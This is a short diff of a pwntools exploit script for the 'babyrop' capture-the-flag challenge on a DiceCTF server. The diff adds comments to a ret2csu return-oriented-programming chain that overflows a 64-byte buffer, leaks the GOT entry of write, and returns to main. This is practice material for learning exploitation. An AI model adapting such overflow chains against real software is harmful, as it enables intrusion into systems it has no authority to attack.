@@ -4,8 +4,10 @@ elf = ELF("./babyrop")
 #r = process(["./babyrop"])
 r = remote("dicec.tf", 31924)
 
+# ROP to CSU
 payload = b"a" * 64 + p64(0x0)
 payload += p64(0x4011CA) + p64(0x0) + p64(0x1) + p64(0x1) + p64(elf.got['write']) + p64(0x8) + p64(elf.got['write']) # r13,r14,r15
+# Fallthrough back to main
 payload += p64(0x4011B0) + p64(0x0) + p64(0x0) + p64(0x405000) + p64(0x0) + p64(0x0) + p64(0x0) + p64(0x0) + p64(0x401136)
 
 r.sendlineafter(": ", payload)
